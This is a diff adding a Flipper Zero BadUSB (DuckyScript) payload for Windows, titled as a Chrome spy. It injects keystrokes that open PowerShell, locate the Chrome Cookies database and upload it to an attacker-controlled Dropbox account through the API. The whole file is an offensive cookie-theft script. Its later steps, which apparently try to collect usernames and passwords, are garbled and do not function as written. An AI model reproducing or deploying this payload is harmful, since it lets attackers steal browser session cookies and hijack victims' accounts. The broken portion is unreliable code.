@@ -1,0 +1,83 @@
+REM ####################################################
+REM #                                                  |
+REM # Title        : BAD-FLIPP3R-CHROME-SPY     |
+REM # Author       : BULLI77                           |
+REM # Version      : 1.0                               |
+REM # Category     : Exfiltration                      |
+REM # Target       : Windows                           |
+REM #                                                  |
+REM ####################################################
+
+
+# Replace with your desired file path on the Flipper Zero's memory card or Replace with your Dropbox access token
+
+DEFINE FILE_PATH "/sdcard/cookies.txt"
+DEFINE DROPBOX_ACCESS_TOKEN "example"
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 2000
+
+# Get Chrome profile directory
+STRINGLN
+    $chromeProfilePath = Join-Path -Path $env:USERPROFILE -ChildPath 'AppData\Local\Google\Chrome\User Data\Default'
+    $filePath = Join-Path -Path $chromeProfilePath -ChildPath 'Cookies'
+
+END_STRINGLN
+
+# Setting about exfiltration
+STRING $accessToken = 
+STRING DROPBOX_ACCESS_TOKEN
+ENTER
+
+STRINGLN
+    $authHeader = @{Authorization = "Bearer $accessToken"}
+    $dropboxFilePath = "/cookies_exported_cookies"
+
+    $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+
+    $headers = @{}
+    $headers.Add("Authorization", "Bearer $accessToken")
+    $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
+    $headers.Add("Content-Type", "application/octet-stream")
+
+    # Use curl instead of Invoke-RestMethod
+    curl -X POST -H @headers -F "file=@$filePath" $uploadUrl
+END_STRINGLN
+STRING {enter}
+DELAY 1000
+
+# Open Microsoft Edge
+GUI r
+STRING MicrosoftEdge.exe
+DELAY 1000
+
+# Navigate to the login page
+GUI t
+STRING https://example.com/login
+DELAY 1000
+
+# Get the username and password from the user
+GUI r
+STRING Enter your username:
+DELAY 1000
+GUI t
+STRING {backspace 10}
+DELAY 1000
+GUI t
+STRING {enter}
+DELAY 1000
+
+GUI r
+STRING Enter your password:
+DELAY 1000
+GUI t
+STRING {backspace 10}
+DELAY 1000
+GUI t
+STRING {enter}
+DELAY 1000
